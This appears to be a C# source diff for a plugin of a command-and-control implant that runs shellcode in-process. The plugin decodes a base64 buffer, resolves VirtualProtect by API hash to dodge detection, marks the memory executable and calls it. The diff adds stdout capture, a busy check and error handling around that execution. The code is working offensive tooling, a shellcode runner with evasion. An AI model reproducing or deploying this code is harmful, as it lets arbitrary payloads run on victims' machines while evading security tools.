@@ -37,22 +37,44 @@ namespace Plugins
             {
                 buffer = Convert.FromBase64String(args["buffer"].ToString());
             }
+
+            if (PluginHandler.StdIsBusy())
+            {
+                PluginHandler.AddResponse(new ResponseResult()
+                {
+                    completed = "true",
+                    user_output = "Stdout is currently in-use",
+                    task_id = args["task-id"],
+                    status = "success"
+                });
+                return;
+            }
+
             Task.Run(() =>
             {
                 unsafe
                 {
-                    fixed (byte* ptr = buffer)
+                    PluginHandler.CaptureStdOut(args["task-id"]);
+                    try
                     {
-                        IntPtr pAddr = (IntPtr)ptr;
-                        uint lpfOldProtect = 0;
-                        IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro); //Get Pointer for VirtualProtect function
-                        VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate)); //Create VirtualProtect Delegate
-                        ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect
+                        fixed (byte* ptr = buffer)
+                        {
+                            IntPtr pAddr = (IntPtr)ptr;
+                            uint lpfOldProtect = 0;
+                            IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro); //Get Pointer for VirtualProtect function
+                            VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate)); //Create VirtualProtect Delegate
+                            ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect
 
-                        BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer
+                            BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer
 
-                        f(); //Execute buffer
+                            f(); //Execute buffer
+                        }
                     }
+                    catch (Exception ex)
+                    {
+                        PluginHandler.Write(ex.ToString(), args["task-id"], true, "error");
+                    }
+                    PluginHandler.ReleaseStdOut();
                 }
             });
 
